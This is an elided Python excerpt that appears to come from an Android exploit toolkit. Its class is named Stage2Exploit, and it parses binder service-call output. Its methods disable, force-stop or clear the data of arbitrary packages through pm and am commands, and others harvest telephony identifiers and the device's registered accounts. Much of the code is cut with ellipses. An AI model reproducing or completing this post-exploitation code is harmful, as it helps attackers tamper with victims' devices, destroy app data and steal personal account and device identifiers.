...
def parse_service_result(service_result: str) -> bytes:
    EXPRESSION = re.compile("^(?:Result\\: Parcel\\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\\)?$")
    matched_any = False
    result = b''
    ...
    if not matched_any:
        if "Result: Parcel(00000000    '....')" in service_result:
            return b''
...
class Stage2Exploit:
    ...
    def manage_package(self, package: str, action: str):
        cmd_map = {'disable': f'pm disable-user --user 0 {package}', 'enable': f'pm enable {package}', 'stop': f'am force-stop {package}', 'clear': f'pm clear {package}'}
    ...
    def get_telephony_info(self):
        ...
        for name, code in codes.items():
            ...
            try:
                raw_hex = ''.join(re.findall('0x[0-9a-f]{8}: ([0-9a-f ]{35})', res))
    ...
    def get_accounts(self):
        ...
        accounts = []
        matches = re.findall('Account \\{name=(.*?), type=(.*?)\\}', res)
